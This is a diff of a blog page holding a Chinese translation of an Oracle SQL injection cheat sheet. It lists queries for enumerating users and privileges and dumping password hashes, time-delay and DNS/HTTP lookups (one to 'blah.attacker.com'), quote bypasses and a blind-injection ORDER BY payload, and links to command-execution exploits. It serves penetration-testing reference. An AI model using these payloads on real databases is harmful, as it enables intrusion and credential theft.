@@ -5,27 +5,23 @@
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
 	<meta http-equiv="X-UA-Compatible" content="ie=edge">
-
 <meta itemprop="name" content="Oracle注入速查表">
-<meta itemprop="description" content="Oracle注入速查表 2015/8/28 17:30 下午 本文由Yinzo翻译，转载请保留署名。原文地址：http://pentestmonkey.net/cheat-">
-
-
+<meta itemprop="description" content="Oracle注入速查表 注：下面的一部分查询只能由admin执行，我会在查询的末尾以&rdquo;-priv“标注。 探测版本： SELECT banner FROM v$version WHERE banner LIKE ‘">
 <meta itemprop="datePublished" content="2015-08-28T17:30:00&#43;08:00" />
 <meta itemprop="dateModified" content="2015-08-28T17:30:00&#43;08:00" />
-<meta itemprop="wordCount" content="1654">
+<meta itemprop="wordCount" content="1537">
 
 
 
-<meta itemprop="keywords" content="untagged," />
-<meta property="og:title" content="Oracle注入速查表" />
-<meta property="og:description" content="Oracle注入速查表 2015/8/28 17:30 下午 本文由Yinzo翻译，转载请保留署名。原文地址：http://pentestmonkey.net/cheat-" />
+<meta itemprop="keywords" content="untagged," /><meta property="og:title" content="Oracle注入速查表" />
+<meta property="og:description" content="Oracle注入速查表 注：下面的一部分查询只能由admin执行，我会在查询的末尾以&rdquo;-priv“标注。 探测版本： SELECT banner FROM v$version WHERE banner LIKE ‘" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://yinzo.github.io/posts/oracle%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E8%A1%A8/" />
-<meta property="article:published_time" content="2015-08-28T17:30:00&#43;08:00"/>
-<meta property="article:modified_time" content="2015-08-28T17:30:00&#43;08:00"/>
+<meta property="article:published_time" content="2015-08-28T17:30:00+08:00" />
+<meta property="article:modified_time" content="2015-08-28T17:30:00+08:00" />
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Oracle注入速查表"/>
-<meta name="twitter:description" content="Oracle注入速查表 2015/8/28 17:30 下午 本文由Yinzo翻译，转载请保留署名。原文地址：http://pentestmonkey.net/cheat-"/>
+<meta name="twitter:description" content="Oracle注入速查表 注：下面的一部分查询只能由admin执行，我会在查询的末尾以&rdquo;-priv“标注。 探测版本： SELECT banner FROM v$version WHERE banner LIKE ‘"/>
 
 	<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
 	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
@@ -35,7 +31,7 @@
 	<link rel="shortcut icon" href="/favicon.ico">
 
 	<title>Oracle注入速查表</title>
-	<link rel="stylesheet" href="https://yinzo.github.io/css/style.min.20e6e5df1f989a2a36ed7cbce604b2672cfea0e8acef9930825ffb5f85914012.css" integrity="sha256-IObl3x+Ymio27Xy85gSyZyz+oOis75kwgl/7X4WRQBI=" crossorigin="anonymous">
+	<link rel="stylesheet" href="https://yinzo.github.io/css/style.min.657bcb7af31123e4156b1a3d2ff60a636717e54ead74f882136b5114cf72b55e.css" integrity="sha256-ZXvLevMRI+QVaxo9L/YKY2cX5U6tdPiCE2tRFM9ytV4=" crossorigin="anonymous">
 	
 </head>
 
@@ -72,222 +68,137 @@
 				<h1>Oracle注入速查表</h1>
 			</header>
 			<div class="content">
-				
-
-<h1 id="oracle注入速查表">Oracle注入速查表<a href="#oracle注入速查表" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h1>
-
-<p><div class="read-more clearfix">
-<span class="date">2015/8/28 17:30 下午</span>
-<span class="comments">
-</span>
-</div>
-<small>本文由Yinzo翻译，转载请保留署名。原文地址：<a href="http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet">http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet</a></small></p>
-
+				<h1 id="oracle注入速查表">Oracle注入速查表<a href="#oracle注入速查表" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h1>
+<!-- raw HTML omitted -->
 <p>注：下面的一部分查询只能由admin执行，我会在查询的末尾以&rdquo;<strong><code>-priv</code></strong>“标注。</p>
-
-<p><span id="more"></span><!-- more --></p>
-
+<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <p>探测版本：</p>
-
 <pre><code>SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’;
 SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’;  
 SELECT version FROM v$instance;
 </code></pre>
-
 <p>注释：</p>
-
 <pre><code>SELECT 1 FROM dual — comment
 </code></pre>
-
 <p><em>注: Oracle的SELECT语句必须包含FROM从句，所以当我们并不是真的准备查询一个表的时候，我们必须使用一个假的表名‘dual’</em></p>
-
 <p>当前用户：</p>
-
 <pre><code>SELECT user FROM dual
 </code></pre>
-
 <p>列出所有用户：</p>
-
 <pre><code>SELECT username FROM all_users ORDER BY username;
 SELECT name FROM sys.user$; — priv
 </code></pre>
-
 <p>列出密码哈希：</p>
-
 <pre><code>SELECT name, password, astatus FROM sys.user$ — priv, &amp;lt;= 10g.  astatus能够在acct被锁定的状态下给你反馈
 SELECT name,spare4 FROM sys.user$ — priv, 11g
 </code></pre>
-
 <p>密码破解：</p>
-
 <p><a href="http://www.red-database-security.com/software/checkpwd.html">checkpwd</a>能够把Oracle8,9,10的基于DES的哈希破解掉</p>
-
 <p>列出权限：</p>
-
 <pre><code>SELECT * FROM session_privs; —当前用户的权限
 SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’; — priv, 列出指定用户的权限
 SELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY DICTIONARY’; — priv, 找到拥有某个权限的用户
 SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;
 </code></pre>
-
 <p>列出DBA账户：</p>
-
 <pre><code>SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’; — priv, 列出DBA和对应权限
 </code></pre>
-
 <p>当前数据库：</p>
-
 <pre><code>SELECT global_name FROM global_name;
 SELECT name FROM v$database;
 SELECT instance_name FROM v$instance;
 SELECT SYS.DATABASE_NAME FROM DUAL;
 </code></pre>
-
 <p>列出数据库：</p>
-
 <pre><code>SELECT DISTINCT owner FROM all_tables; — 列出数据库 (一个用户一个)
 </code></pre>
-
 <p>– 通过查询TNS监听程序能够查询到其他数据库.详情看<a href="http://www.jammed.com/%7Ejwa/hacks/security/tnscmd/tnscmd-doc.html">tnscmd</a>。</p>
-
 <p>列出字段名：</p>
-
 <pre><code>SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’;
 SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’;
 </code></pre>
-
 <p>列出表名：</p>
-
 <pre><code>SELECT table_name FROM all_tables;
 SELECT owner, table_name FROM all_tables;
 </code></pre>
-
 <p>通过字段名找到对应表：</p>
-
 <pre><code>SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE ‘%PASS%’;  
 </code></pre>
-
 <p>— 注: 表名都是大写</p>
-
 <p>查询第N行：</p>
-
 <pre><code>SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; — 查询第9行(从1开始数)
 </code></pre>
-
 <p>查询第N个字符：</p>
-
 <pre><code>SELECT substr(‘abcd’, 3, 1) FROM dual; — 得到第三个字符‘c’
 </code></pre>
-
 <p>按位与(Bitwise AND)：</p>
-
 <pre><code>SELECT bitand(6,2) FROM dual; — 返回2
 SELECT bitand(6,1) FROM dual; — 返回0
 </code></pre>
-
 <p>ASCII值转字符：</p>
-
 <pre><code>SELECT chr(65) FROM dual; — 返回A
 </code></pre>
-
 <p>字符转ASCII码：</p>
-
 <pre><code>SELECT ascii(‘A’) FROM dual; — 返回65
 </code></pre>
-
 <p>类型转换：</p>
-
 <pre><code>SELECT CAST(1 AS char) FROM dual;
 SELECT CAST(’1′ AS int) FROM dual;
 </code></pre>
-
 <p>拼接字符：</p>
-
 <pre><code>SELECT ‘A’ || ‘B’ FROM dual; — 返回AB
 </code></pre>
-
 <p>IF语句：</p>
-
 <pre><code>BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END; 
 </code></pre>
-
 <p>— 跟SELECT语句在一起时不太管用</p>
-
 <p>Case语句：</p>
-
 <pre><code>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; — 返回1
 SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; — 返回2
 </code></pre>
-
 <p>绕过引号：</p>
-
 <pre><code>SELECT chr(65) || chr(66) FROM dual; — 返回AB
 </code></pre>
-
 <p>延时：</p>
-
 <pre><code>BEGIN DBMS_LOCK.SLEEP(5); END; — priv, 在SELECT中用不了
 SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — 如果反查很慢
 SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual; — 如果正查很慢
 SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual; — 如果发送TCP包被拦截或者很慢
 </code></pre>
-
 <p>— 更多关于延时的内容请看<a href="http://technet.microsoft.com/en-us/library/cc512676.aspx">Heavy Queries</a></p>
-
 <p>发送DNS请求：</p>
-
 <pre><code>SELECT UTL_INADDR.get_host_address(‘google.com’) FROM dual;
 SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual;
 </code></pre>
-
 <p>命令执行：</p>
-
 <p>如果目标机装了JAVA就能执行命令，<a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">看这里</a></p>
-
 <p>有时候ExtProc也可以，不过我一般都成功不了，<a href="http://www.0xdeadbeef.info/exploits/raptor_oraextproc.sql">看这里</a></p>
-
 <p>本地文件读取：</p>
-
 <p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">UTL_FILE</a>有时候能用。如果下面的语句没有返回null就行。</p>
-
 <pre><code>SELECT value FROM v$parameter2 WHERE name = ‘utl_file_dir’;
 </code></pre>
-
 <p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">JAVA</a>能用来读取和写入文件，除了Oracle Express</p>
-
 <p>主机名称、IP地址：</p>
-
 <pre><code>SELECT UTL_INADDR.get_host_name FROM dual;
 SELECT host_name FROM v$instance;
 SELECT UTL_INADDR.get_host_address FROM dual; — 查IP
 SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — 查主机名称
 </code></pre>
-
 <p>定位DB文件：</p>
-
 <pre><code>SELECT name FROM V$DATAFILE;
 </code></pre>
-
 <p>默认系统和数据库：</p>
-
 <pre><code>SYSTEM
 SYSAUX
 </code></pre>
-
-<h3 id="toc_0">额外小贴士：<a href="#toc_0" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
-
+<!-- raw HTML omitted -->
 <p>一个字符串列出所有表名：</p>
-
 <pre><code>select rtrim(xmlagg(xmlelement(e, table_name || ‘,’)).extract(‘//text()’).extract(‘//text()’) ,’,') from all_tables 
 </code></pre>
-
 <p>– 当你union联查注入的时候只有一行能用与返回数据时使用</p>
-
 <p>盲注排序：</p>
-
 <pre><code>order by case when ((select 1 from user_tables where substr(lower(table_name), 1, 1) = ‘a’ and rownum = 1)=1) then column_name1 else column_name2 end 
 </code></pre>
-
 <p>— 你必须知道两个拥有相同数据类型的字段名才能用</p>
 
 			</div>
@@ -296,7 +207,7 @@ SYSAUX
 				<p>
 					<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://yinzo.github.io/tags/untagged">untagged</a></span>
 				</p>
-				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>1654 Words</p>
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>1537 Words</p>
 				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2015-08-28 17:30 &#43;0800</p>
 			</footer>
 		</article>
@@ -424,7 +335,7 @@ SYSAUX
 	</main>
 
 	<footer id="site-footer" class="section-inner thin animated fadeIn faster">
-		<p>&copy; 2020 <a href="https://yinzo.github.io/">Yinzo</a></p>
+		<p>&copy; 2021 <a href="https://yinzo.github.io/">Yinzo</a></p>
 		<p>
 			Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> &#183; Theme <a href="https://github.com/Track3/hermit" target="_blank" rel="noopener">Hermit</a> &#183; <a href="https://yinzo.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
 		</p>
@@ -440,7 +351,7 @@ SYSAUX
 	  </script>
 
 
-	<script src="https://yinzo.github.io/js/bundle.min.490e43e5af6db5906f28afa49a4e16bf9f626b758e3fca92f146b870eb94bb37.js" integrity="sha256-SQ5D5a9ttZBvKK+kmk4Wv59ia3WOP8qS8Ua4cOuUuzc=" crossorigin="anonymous"></script>
+	<script src="https://yinzo.github.io/js/bundle.min.4a9a0ac3d2217822c7865b4161e6c2a71de1d70492264337755427898dd718f6.js" integrity="sha256-SpoKw9IheCLHhltBYebCpx3h1wSSJkM3dVQniY3XGPY=" crossorigin="anonymous"></script>
 	
 
 </body>
